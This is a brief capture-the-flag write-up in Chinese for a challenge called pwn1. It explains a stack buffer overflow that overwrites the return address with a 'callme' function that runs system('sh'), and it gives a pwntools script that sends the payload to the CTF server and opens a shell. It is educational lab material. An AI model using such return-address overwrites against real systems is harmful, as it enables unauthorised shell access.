## pwn1
題目已經說明是stack buffer overflow，nm可以發現一個function叫`callme`，反組譯後發現內容是`system('sh')`，因此利用buffer overflow將return address蓋為`callme`即可。

```python
#!/usr/bin/env python3
from pwn import *
context(arch='amd64')

p = remote('csie.ctf.tw', 10120)
b = ELF('pwn1')

payload = cyclic(40).encode() + p64(b.symbols[b'callme'])
p.sendline(payload)
p.interactive()
```
